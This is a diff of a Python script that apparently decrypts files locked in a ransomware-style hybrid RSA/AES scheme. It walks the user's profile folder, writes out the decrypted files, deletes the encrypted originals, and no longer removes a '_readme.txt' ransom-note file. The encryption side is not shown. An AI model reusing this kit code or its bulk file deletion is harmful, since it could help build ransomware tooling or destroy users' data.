@@ -5,7 +5,6 @@ from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
 from Crypto.Cipher import AES, PKCS1_OAEP
 
-lcx = xf.generate_key().decode()
 
 def defense(target):
     for p, d, f in os.walk(target):
@@ -15,10 +14,10 @@ def defense(target):
                     #encrypt(os.path.join(p, name),RSA.importKey(pbk))
 
                     with open(p + name, "rb") as mfile:
-                        newFile = os.path.splitext(name)[0]
+                        newFile = p + os.path.splitext(name)[0]
                         file_in = open(newFile, "wb")
 
-                        private_key = RSA.import_key(open("privateKey.pem").read())
+                        private_key = RSA.import_key(open("private.pem").read())
 
                         enc_session_key, nonce, tag, ciphertext = [ mfile.read(x) for x in (private_key.size_in_bytes(), 16, 16, -1) ]
                         mfile.close()
@@ -32,13 +31,11 @@ def defense(target):
                         data = cipher_aes.decrypt_and_verify(ciphertext, tag)
                         file_in.write(data)
                         file_in.close()
+                        mfile.close()
+                        os.remove(os.path.join(p, name))
                 except:
                     continue
-            try:
-                os.remove(os.path.join(p, "_readme.txt"))
-            except PermissionError:
-                problem = "Tidak bisa di isi file"
 
 if __name__ == '__main__':
-    t0 = "H:"
+    t0 = os.environ["USERPROFILE"]
     defense(t0)
